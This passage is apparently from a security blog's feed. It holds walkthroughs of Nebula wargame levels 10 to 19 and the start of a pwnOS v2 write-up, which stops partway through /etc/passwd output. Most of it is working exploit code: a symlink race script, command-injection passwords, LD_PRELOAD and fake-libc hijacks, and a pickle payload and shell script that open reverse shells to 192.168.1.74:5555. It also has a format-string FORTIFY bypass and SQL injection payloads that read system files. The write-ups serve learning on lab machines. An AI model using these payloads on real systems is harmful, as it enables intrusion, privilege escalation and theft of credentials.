<p>Level 10 introduces a bit of networking; an application binary exists in the flag&rsquo;s folder, which reads a file and host from stdin and sends the file to the host over port 18211.  The binary first makes a call to access() to verify the user has adequate privileges; if not, a connection to the remote host is made and the file sent.  The vulnerability is a classic TOCTTOU (time of check to time of use); the application first checks if the user has access, then goes about creating a socket, making the connection, and sending the header.  With the following script, we can brute force the race condition:</p>

<p>```</p>

<h1>!/bin/bash</h1>

<p>unlink /tmp/token
touch /tmp/token
/home/flag10/flag10 /tmp/token 192.168.1.74 &amp;
rm -f /tmp/token
ln -s /home/flag10/token /tmp/token
```</p>

<p>I then started up a netcat listener on my remote host.  After about 30-40 iterations, I had flag 10&rsquo;s password.</p>

<h3>Level 11</h3>


<p>This is our first tricky level, I thought, that required a bit of leg work and thought.  The instructions state there are two ways to finish this level; I&rsquo;m assuming that&rsquo;s through one of two code paths present in the binary.  Essentially if our content header is &lt; 1024 we take the first transformation path, and if it&rsquo;s > 1024, we take the second.  The objective is to pass in already encrypted data that, when decrypted, can grab our flag.  If we send in encrypted data after a 1024 byte buffer, we can get decrypted commands to the system() call.  I wrote a small C application that runs the exact runtime from the given source and spits to stdout, which can then be piped to flag11 <code>./generate getflag | /home/flag11/flag11</code>.</p>

<h3>Level 12</h3>


<p>This level has a local telnet script listening on port 50001 that employs a lua script to handle all of its happenings.  The script accepts a password, hashes it, and checks it against a hard coded hash.  The vulnerability here is how it&rsquo;s actually verifying the password; the following line exemplifies the issue: <code>prog = io.popen("echo "..password.." | sha1sum", "r")</code>.  The listener receives input, and echo&rsquo;s it into sha1sum.  If we inject commands into our password, we should be able to snag the flag.  Executing <code>f | getflag &gt; /tmp/test | echo "test"</code> as a password should result in our flag when you <code>cat /tmp/test</code>.</p>

<h3>Level 13</h3>


<p>I was initially a little confused about the goal for this level; <code>cat /etc/passwd | grep 1000</code> returned the nebula account, which we &ldquo;technically&rdquo; don&rsquo;t know.  I then started looking for ways to preload a modified library, so we could override the getuid() call and just return 1000.  This led me <a href="http://www.ibm.com/developerworks/library/l-glibc/index.html">here</a>, which I was painlessly able to pull off:</p>

<p>```
level13@nebula: cat moduid.c</p>

<h1>include &lt;unistd.h></h1>

<p>uid_t getuid(){ return 1000; }
level13@nebula: gcc -shared -o moduid.so moduid.c
level13@nebula: LD_PRELOAD=moduid.so ./flag13
```</p>

<p>Running this dumps our token to stdout.  Another method may be modifying the binary itself, but I don&rsquo;t know how legal that is.  This was a neat vulnerability, and something I haven&rsquo;t run into before.</p>

<h3>Level 14</h3>


<p>Now I&rsquo;m convinced that running the binaries in a debugger is legal.  This level has a binary that only encrypts information; so, the objective here is to discover the encryption algorithm and write a complimentary decryption routine.  Playing around with the encryption tool allowed me to quickly discover what it was doing, without having to delve into assembly:</p>

<p><code>
abcdefg -&gt; acegikm
a -&gt; a (idx + 0)
b -&gt; c (idx + 1)
c -&gt; e (idx + 2)
d -&gt; g (idx + 3)
e -&gt; i (idx + 4)
f -&gt; k (idx + 5)
g -&gt; m (idx + 6)
</code></p>

<p>So to reverse this, we just need to subtract the index.  I wrote a quick python script for doing this:</p>

<p>```
import sys</p>

<p>def decrypt(args):</p>

<pre><code>ciph = args[2]
plain = ''
print 'Decrypting ', ciph
for idx in xrange(len(ciph)):
    tmp = (ord(ciph[idx])-65)-idx
    plain += chr(tmp+65)
print 'Decrypted: ', plain
</code></pre>

<p>def encrypt(args):</p>

<pre><code>plain = args[2]
ciph = ''
print 'Encrypting ', plain
for idx in xrange(len(plain)):
    tmp = (ord(plain[idx])-65)+idx
    ciph += chr(tmp+65)
print 'Encrypted: ', ciph
</code></pre>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print '%s: [-d] [cipher] [-e] [plain]'%sys.argv[0]
sys.exit(1)
</code></pre>

<p>if &lsquo;-d&rsquo; in sys.argv:</p>

<pre><code>decrypt(sys.argv)
</code></pre>

<p>elif &lsquo;-e&rsquo; in sys.argv:</p>

<pre><code>encrypt(sys.argv)
</code></pre>

<p>```</p>

<p>Now we just need to pass in the output of the encrypted token file to obtain our flag.</p>

<h3>Level 15</h3>


<p>If we strace flag15, we see a ton of access attempts to libc.so.6 in various folders in <code>/var/tmp/flag15</code>.  My first idea was to forgo the libc loading stuff and try wrapping the puts call and use the preload vulnerability again:</p>

<p>```
level15@nebula:/tmp$ cat wrapper.c</p>

<h1>include &lt;unistd.h></h1>

<p>int __wrap_puts(const char *s){</p>

<pre><code>system("/bin/getflag &gt; /tmp/flagged");
return puts(s);
</code></pre>

<p>}
level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15
```</p>

<p>Unfortunately, the protection mechanism for preloading libraries catches us.  The loader will completely ignore the preloaded library if the RUID is not equal to the EUID and unlike level 13, we need to execute a binary, not simply obtain a token embedded in the binary.</p>

<p>So instead we need to compile a statically linked library and get it to call that library with whatever function it&rsquo;s using.  Object dumping the file, we find our main quite small:</p>

<p><code>
level15@nebula:/home/flag15$ objdump -d -M intel flag15
[....]
08048330 &lt;main&gt;:
 8048330:  55                     push   %ebp
 8048331:  89 e5                  mov    %esp,%ebp
 8048333:  83 e4 f0               and    $0xfffffff0,%esp
 8048336:  83 ec 10               sub    $0x10,%esp
 8048339:  c7 04 24 d0 84 04 08   movl   $0x80484d0,(%esp)
 8048340:  e8 bb ff ff ff         call   8048300 &lt;puts@plt&gt;
 8048345:  c9                     leave  
 8048346:  c3                     ret    
 8048347:  90                     nop
</code></p>

<p>The only function it calls is puts, so we need to override that; we also need a target location.  <code>/var/tmp/flag15/libc.so.6</code> appears to be the least nested.  Here&rsquo;s the library code:</p>

<p>```
level15@nebula:/home/flag15$ cat /tmp/lib.c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<p>int puts(const char *s){
  system(&ldquo;/bin/getflag > /tmp/flagged&rdquo;);
}</p>

<p>int __libc_start_main(int (*main)(int, char <strong>, char </strong>),</p>

<pre><code>       int argc, char **argv,
      void (*init)(void),
      void (*fini)(void),
      void (*rtld_fini)(void),
      void (*stack_end))
{ main(argc, argv, NULL);
</code></pre>

<p>  return 0;
}
level15@nebula:/home/flag15$
```</p>

<p>We just need to compile and statically link this to the library path:</p>

<p><code>
level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
/tmp/lib.c: In function ‘puts’:
/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
level15@nebula:/home/flag15$ ./flag15
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
</code></p>

<p>This, <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">apparently</a>, means that the library version number is lower on the shared object.  So we&rsquo;ll need to generate a version file and link it in:</p>

<p>```
level15@nebula:/home/flag15$ cat /tmp/versionz
GLIBC_2.0{
  <strong>cxa_finalize;
  </strong>libc_start_main;
  puts;
};
GLIBC_2.1.3 {
}GLIBC_2.0;</p>

<p>GLIBC_2.4{
}GLIBC_2.0;
level15@nebula:/home/flag15$
```</p>

<p>Recompile with &mdash;version-script=/tmp/versionz and&hellip;</p>

<p><code>
level15@nebula:/home/flag15$ ./flag15
Segmentation fault
level15@nebula:/home/flag15$ cat /tmp/flagged
You have successfully executed getflag on a target account
level15@nebula:/home/flag15$
</code></p>

<h3>Level 16</h3>


<p>Level 16 has an HTTP server that hosts a simple CGI script.  In it, it parses off two parameters (username &amp; password) from the URL, then the username is converted to uppercase and everything after a space is stripped.  It then uses it as an argument to egrep:</p>

<p><code>
@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`;
</code></p>

<p>This level took a bit of thought and a frustrating amount of tinkering; it&rsquo;s obvious where the vulnerability is, but it&rsquo;s not so obvious what we actually need to do.  All input is run through the two filters, so we&rsquo;ll need to either send in post-manipulated data that will be changed back when run, or some other voodoo that&rsquo;ll correctly be interpreted by bash and not touched by the filters.</p>

<p>The easiest, and shortest, command will be a script.  Normally, you wouldn&rsquo;t have access to the underlying host, but we do, so for now we&rsquo;ll take advantage of it.  I"ll admit I spent more time Googling around for this one than any of the previous; I happened to stumble into <a href="http://serverfault.com/questions/221318/bash-wildcard-expansion">this</a> Stack Overflow post about bash wildcard expansion:</p>

<p><code>
level16@nebula:~$ pwd
/tmp
level16@nebula:~$ ls
SHELL
level16@nebula:~$ ls /*/SHELL
/tmp/SHELL
</code></p>

<p>Wildcards aren&rsquo;t anything new, but I never knew that you could use it as such.  This means we need to have our username evaluated as <code>/*/shell</code>, so when it&rsquo;s expanded it&rsquo;ll be <code>/tmp/SHELL</code>.  The final result:</p>

<p><code>
http://192.168.1.206:1616/index.cgi?username=%22%60%2f*%2fshell%60%22&amp;password=dolphin
</code></p>

<p>Add in a netcat call back to a script SHELL in tmp (see level 17) and it&rsquo;s game over.</p>

<h3>Level 17</h3>


<p>This level is yet another vulnerable listener, this time implemented in Python.  The vulnerability lies in the Pickle module, where one look at documentation gets you:</p>

<p><code>
Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
</code></p>

<p>Because our input is never sanitized, we just need to send a specially crafted input string to be unpickled and execute malicious code.  <a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">This</a> Blackhat whitepaper came in handy when figuring out how the parsing engine worked, and once I had that figured out it was pretty easy:</p>

<p>```
import socket</p>

<p>cmd = &ldquo;cos\nsystem\n(S'/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&amp;1'\ntR.\n&rdquo;
try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.206', 10007))
data = sock.recv(512)
print 'Got: ', data
sock.send(cmd)
sock.close()
</code></pre>

<p>except Exception, e: print e
```</p>

<p>I had a netcat shell listening on port 5555 for the call back.  I used this method because the Nebula box doesn&rsquo;t have netcat-traditional on it, which lacks the -e flag.  This is a neat way of opening a reverse shell without the fuss of named pipes.</p>

<h3>Level 18</h3>


<p>According to the level documentation, this can be completed in three different ways at three different difficulty levels.  The binary appears to be a hackney attempt at some sort of login program; with it, a user can &ldquo;login&rdquo; to elevate privileges, set user, do some debugging, and some other smaller things.  Immediately though I see a buffer overflow:</p>

<p><code>
level18@nebula:/home/flag18$ ./flag18
setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xdbd8d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0xdbc6d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0xdbbd35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0xd41f91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0xd19305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0xdbbe09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xdbbd1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xcef113]
./flag18[0x8048bb1]
======= Memory map: ========
00324000-00325000 r-xp 00000000 00:00 0          [vdso]
00358000-00376000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00376000-00377000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00377000-00378000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00c9b000-00cb7000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cb7000-00cb8000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cb8000-00cb9000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cd6000-00e4c000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4c000-00e4e000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4e000-00e4f000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4f000-00e52000 rw-p 00000000 00:00 0
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
082c5000-082e6000 rw-p 00000000 00:00 0          [heap]
b77a8000-b77a9000 rw-p 00000000 00:00 0
b77b1000-b77b4000 rw-p 00000000 00:00 0
bfabf000-bfae0000 rw-p 00000000 00:00 0          [stack]
Aborted
level18@nebula:/home/flag18$
</code></p>

<p>I guess not.  It appears it&rsquo;s been compiled with a bit of protection:</p>

<p><code>
level18@nebula:/home/flag18$ ./checksec.sh --file flag18
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   flag18
level18@nebula:/home/flag18$
</code></p>

<p>On deeper inspection of the code, it appears there are several logic flaws that could allow simple execution of a root shell.</p>

<p>The first issue is that there&rsquo;s no restriction on what file we&rsquo;re debugging to, so long as we&rsquo;ve got the privileges required to open it.  In this case, this means we can debug to the same file that we&rsquo;re checking passwords against.  Since we can&rsquo;t actually read the file, we need to infer:</p>

<p><code>
level18@nebula:/home/flag18$ ./flag18 -d /home/flag18/password
^Clevel18@nebula:/home/flag18$ ls -lh password
-rw------- 1 flag18 flag18 31 2013-03-20 00:38 password
level18@nebula:/home/flag18$ echo Starting up. Verbose level = 0 | wc -c
31
level18@nebula:/home/flag18$
</code></p>

<p>So we read without error and we know the exact data in the file.  The problem with this is that it strips newlines, and with fgets we don&rsquo;t have a nice way of inserting them.</p>

<p>The second issue I discovered involved the command site exec, which doesn&rsquo;t properly format output, and won&rsquo;t append newlines (which may be used to further the first issue).</p>

<p><code>
level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg
site exec %n
*** %n in writable segment detected ***
Aborted
level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg
site exec %4$x
*** invalid %N$ use detected ***
Aborted
level18@nebula:/home/flag18$
</code></p>

<p>This means that our binary was likely compiled with <a href="https://wiki.edubuntu.org/ToolChain/CompilerFlags">FORTIFY_SOURCE=2</a>.  <a href="http://gcc.gnu.org/ml/gcc-patches/2004-09/msg02055.html">Here&rsquo;s</a> the patch that explains what it is and prevents, and the differences between 1 and 2.  Because I don&rsquo;t take doors slammed in my face very well, and it&rsquo;s late, it&rsquo;s time to break out the <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9">phrack</a>:</p>

<p>```
level18@nebula:/home/flag18$ gdb ./flag18
Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.
(gdb) r -d /tmp/dbg
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*269168516$x %1073741824$</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x0028b359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb)
```</p>

<p>Exploitation of this wasn&rsquo;t trivial, but it was eye-opening into some of the things you can accomplish with format string vulnerabilities.  Because our binary was compiled with FORTIFY_SOURCE, there are essentially two things we need to do: disable the FORTIFY flag, and disable the argument filler.  The argument filler essentially sets every argument in arguments[argc] to -1, then fills in the user supplied arguments.  Any -1&rsquo;s remaining will cause an error.  At a high level we&rsquo;re doing this:
+ Disable FORTIFY_SOURCE flag
+ Modify nargs to blow up
+ Be happy</p>

<p>The Phrack article does a better job of explaining this than I do, so if you&rsquo;d like an in-depth analysis of all this, follow the article.  Anyway &mdash; finding and disabling FORTIFY_SOURCE:</p>

<p>```
level18@nebula:/home/flag18$ gdb ./flag18
Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.
(gdb) b vfprintf
Function &ldquo;vfprintf&rdquo; not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (vfprintf) pending.
(gdb) r -d /tmp/dbg
site exec %1$*2222848$x %1073741824$</p>

<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.</p>

<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) tb *(vfprintf+4649)
Temporary breakpoint 2 at 0x172359
(gdb) c
Continuing.</p>

<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/x $eax
0xbfffef60:    0xfbad8004
(gdb) x/20wx $eax
0xbfffef60:    0xfbad8004    0xbffff4f8    0x0017192c    0xbffff528
0xbfffef70:    0xbfffcf60    0xbfffcf60    0xbfffef60    0x00000000
0xbfffef80:    0x00000000    0x00000000    0x00000027    0x08049017
0xbfffef90:    0xfbad8004    0x00000000    0x00000000    0x00000004
0xbfffefa0:    0xbfffcf90    0xbf00cfaf    0x00000000    0x00000000
(gdb) x/wx 0xbfffef9c
0xbfffef9c:    0x00000004
(gdb)
```</p>

<p>There&rsquo;s obviously a bit of cheating here, but bare with me: we&rsquo;re essentially breaking on vfprintf, which receives a file pointer, a formatter, and an argument list.  We then take a peek at the stack, note our file pointer, and find the flag inside (0x000000004).  We know need to calculate the offset:</p>

<p><code>
(gdb) x/wx 0xbfffef9c
0xbfffef9c:    0x00000004
(gdb) p/d ((0xbfffef9c-$ecx)&amp;0xffffffff)/4
$1 = 2847
(gdb)
</code></p>

<p>And accounting for off-by-one, it&rsquo;s 2848.  So:</p>

<p>```
(gdb) r -d /tmp/dbg
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*2848$x %1073741824$</p>

<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) tb *(vfprintf+4649)
Temporary breakpoint 4 at 0x172359
(gdb) c
Continuing.</p>

<p>Temporary breakpoint 4, 0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/i $eip
=> 0x172359 &lt;vfprintf+4649>:    mov    DWORD PTR [edx+eax<em>4],0x0
(gdb) x/wx $ecx+$eax</em>4
0xbfffef9c:    0x00000004
(gdb)
```</p>

<p>Great, we&rsquo;ve got the correct value for clobbering that flag.  Now we need to find the offset for clobbering nargs:</p>

<p>```
(gdb) find 0xbfff0000, 0xbffffff0, 0xdeadbeef
0xbfff5568
0xbfff59ec
2 patterns found.
(gdb) -r
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*283434$x %1073741824$</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) p/d (0xbfff5568-$ecx)/4 + 1
$6 = 479
(gdb)
```</p>

<p>I got stuck here for awhile, and after some googling I discovered someone had already solved this level this way!  So I took <a href="http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html">his</a> advice and created an environmental variable that would lower the stack address and not segfault.  The final phase is now upon us; smuggling shellcode in.  The Phrack article gets a little hairy at this point, so instead of screwing around with adjusting stack offsets, I decided to just take the route that v0id took in his blog post.  His process involves setting the loggedin variable by way of taking control of uninitialized stack memory, thanks to <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Rosenburg&rsquo;s</a> fantastic post on this topic:</p>

<p>```
site exec |%20$n| %1$<em>479$ %1$</em>2848$ %1073741824$</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00d7af00 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0x41414141    1094795585
ecx            0x0    0
edx            0x1    1
ebx            0xeafff4    15400948
esp            0xbfdb8b9c    0xbfdb8b9c
ebp            0xbfdb97e8    0xbfdb97e8
esi            0xbfdbb810    -1076119536
edi            0xbfdb8bc0    -1076130880
eip            0xd7af00    0xd7af00 &lt;vfprintf+11728>
eflags         0x10246    [ PF ZF IF RF ]
cs             0x73    115
ss             0x7b    123
ds             0x7b    123
es             0x7b    123
fs             0x0    0
gs             0x33    51
(gdb)
```</p>

<p>So we just need to find the loggedin variable, then call shell on it:</p>

<p><code>
(gdb) x/2i $eip
=&gt; 0x8048928 &lt;main+376&gt;:    cmp    DWORD PTR ds:0x804b0b4,0x1
   0x804892f &lt;main+383&gt;:    jle    0x804894d &lt;main+413&gt;
(gdb) x/x 0x804b0b4
0x804b0b0 &lt;globals+4&gt;:    0x00000000
</code></p>

<p>Stick that into our LD_PRELOAD, sprinkle in a bit of stack alignment, and&hellip;</p>

<p><code>``
level18@nebula:/home/flag18$ export LD_PRELOAD=</code>python -c &lsquo;print &ldquo;\xb4\xb0\x04\x08&rdquo;<em>8000&rsquo;`
level18@nebula:/home/flag18$ gdb ./flag18
(gdb) r -d /tmp/dbg
site exec |%20$n| %1$</em>479$ %1$*2848$ %1073741824$
shell
./flag18: -d: invalid option
Usage:    ./flag18 [GNU long option] [option] &hellip;</p>

<pre><code>./flag18 [GNU long option] [option] script-file ...
</code></pre>

<p>GNU long options:</p>

<pre><code>--debug
--debugger
--dump-po-strings
--dump-strings
--help
--init-file
--login
--noediting
--noprofile
--norc
--posix
--protected
--rcfile
--restricted
--verbose
--version
</code></pre>

<p>Shell options:</p>

<pre><code>-irsD or -c command or -O shopt_option        (invocation only)
-abefhkmnptuvxBCHP or -o option
</code></pre>

<p>level18@nebula:/home/flag18$
```</p>

<p>Success!  It&rsquo;s clearly passing in the -d flag to sh, so&hellip;</p>

<p><code>``
level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
shell
/tmp/dbg: line 1: Starting: command not found
/tmp/dbg: line 2: syntax error near unexpected token</code>||&lsquo;
/tmp/dbg: line 2: `|| %134525108%-1274542928 %&rsquo;
level18@nebula:/home/flag18$ cat /tmp/Starting</p>

<h1>!/bin/bash</h1>

<p>/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&amp;1
level18@nebula:/home/flag18$ export PATH=/tmp:$PATH
level18@nebula:/home/flag18$ ./flag18 &mdash;rcfile -d /tmp/dbg
site exec |%20$n| %1$<em>479$ %1$</em>2848$ %1073741824$
shell
flag18@nebula:/home/flag18$
```</p>

<p>A shell was waiting for me on 192.168.1.74:5555.  Lots of subtle intricacies here, but really quite fun.</p>

<p>The third issue is the following snippet:</p>

<p><code>
26  fp = fopen(PWFILE, "r");
 27  if(fp) {
 28    char file[64];
 29
 30    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
 31      dprintf("Unable to read password file %s\n", PWFILE);
 32      return;
 33    }
 34                fclose(fp);
 35    if(strcmp(pw, file) != 0) return;    
 36  }
 37  dprintf("logged in successfully (with%s password file)\n",
 38    fp == NULL ? "out" : "");
 39  
 40  globals.loggedin = 1;
</code></p>

<p>If the application fails to read PWFILE, the flow will automatically assume the user is logged in.  This appears to be either the easy or intermediate way, as source code explicitly calls this case out (with%s password file).  This could be defeated by opening up a ton of files and running the binary, effectively erroring out fopen and getting the loggedin flag set.</p>

<h3>Level 19</h3>


<p>We now arrive at the final level of Nebula.  This level checks the owner of the calling process and, if root, pops a shell.  This level was kinda neat because it requires you to have an understanding of how forking and parent/child processing works; and if you know that, it&rsquo;s pretty easy.  In this level we&rsquo;re going to exploit an <a href="http://www.geekride.com/orphan-zombie-process/">orphan process</a> and its reclamation process.  When a parent of a child process terminates, the child process stays alive and becomes an orphan process.  This orphan process is automatically reclaimed by an init process:</p>

<p>```
Parent generates child process:</p>

<pre><code>        -- child
       /
</code></pre>

<p>parent &mdash;&ndash;/</p>

<p>Parent dies:</p>

<pre><code>    -- child
   X
</code></pre>

<p>x &mdash;&mdash;/</p>

<p>init process discovers child and adopts:</p>

<pre><code>     -- child
    /
</code></pre>

<p>init&mdash;&ndash;/
```</p>

<p>So we want to fork off a process and kill the parent before it calls flag19.  Then, when it goes to stat the process, it will stat init instead of us thereby assuming the role of root.  Here&rsquo;s the code for achieving that:</p>

<p>```</p>

<h1>include &lt;stdlib.h></h1>

<p>void main(void){</p>

<pre><code>pid_t pid;
char cmd[]   = "/home/flag19/flag19";
char *argv[] = {"/bin/sh", "-c", "/bin/getflag &gt; /tmp/flagged"};

switch( pid = fork() ){
    case -1:
        perror("failed to fork\n");
    case 0:
        // execute command when parent dies
        sleep(2);
        execvp(cmd, argv);
    default:
        sleep(1); // wait a sec
        exit(1); // ok kill parent
    }
</code></pre>

<p>}
```</p>

<p>And flag was waiting for us in <code>/tmp/flagged</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving pwn0s v2]]></title>
    <link href="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2/"/>
    <updated>2012-08-09T01:56:45-06:00</updated>
    <id>http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2</id>
    <content type="html"><![CDATA[<p>pwn0sv2 is version two in the pwn0s series (?), and can be found <a href="http://boot2root.info/">here</a> at our good friend g0tmi1k&rsquo;s pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.</p>

<p>The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:</p>

<p>```
Starting Nmap 6.01 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2012-07-14 18:20 CDT
Nmap scan report for 10.10.10.100
Host is up (0.00086s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (protocol 2.0)
| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|<em>2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Welcome to this Site!
MAC Address: 08:00:27:36:5C:EF (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
OS details: Linux 2.6.38 &ndash; 3.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 10.10.10.100
```</p>

<p>There&rsquo;s that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  <a href="http://www.debian.org/security/2008/dsa-1571">Here&rsquo;s</a> a link to the old advisory for the curious.</p>

<p>There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I&rsquo;m given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli.jpg"></p>

<p>And low and behold, we&rsquo;re vulnerable to SQLi.  And away we go.</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli2.jpg"></p>

<p>After playing around with the UNION SELECT&rsquo;s, it finally settled on 8 columns and 4 being the displayed one.  So <code>' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -</code></p>

<p>If you try that, you&rsquo;ll notice you can&rsquo;t actually stick the entire thing into the login box.  Busting Burp open will fix that:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli3.jpg"></p>

<p>Which gives us:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_sqli4.jpg"></p>

<p>Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.</p>

<p>```
&lsquo; UNION SELECT 1,2,3,version(),5,6,7,8&mdash; &ndash;</p>

<pre><code>  Welcome 5.1.54-1ubuntu4
</code></pre>

<p>&lsquo; UNION SELECT 1,2,3,database(),5,6,7,8&mdash; &ndash;</p>

<pre><code>  Welcome ch16
</code></pre>

<p>&lsquo; UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8&mdash; &ndash;</p>

<pre><code>  An error occured(...)
</code></pre>

<p>```</p>

<p>Looks like they&rsquo;re at the very least escaping slashes.  No problem:</p>

<p>```</p>

<blockquote><p>echo -n &lsquo;/etc/passwd&rsquo; | xxd -ps &ndash;
2f6574632f706173737764
&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8&mdash; &ndash;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
